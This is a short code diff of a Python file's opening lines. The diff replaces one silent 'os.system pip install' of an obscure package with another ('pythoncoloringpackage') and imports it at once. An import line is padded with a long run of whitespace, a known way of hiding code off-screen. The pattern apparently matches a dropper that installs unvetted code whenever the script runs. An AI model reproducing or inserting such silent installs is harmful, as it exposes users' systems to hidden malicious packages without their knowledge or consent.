@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonfontingkitsV2")
-import pythonfontingkitsV2
+os.system("pip install pythoncoloringpackage")
+import pythoncoloringpackage
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
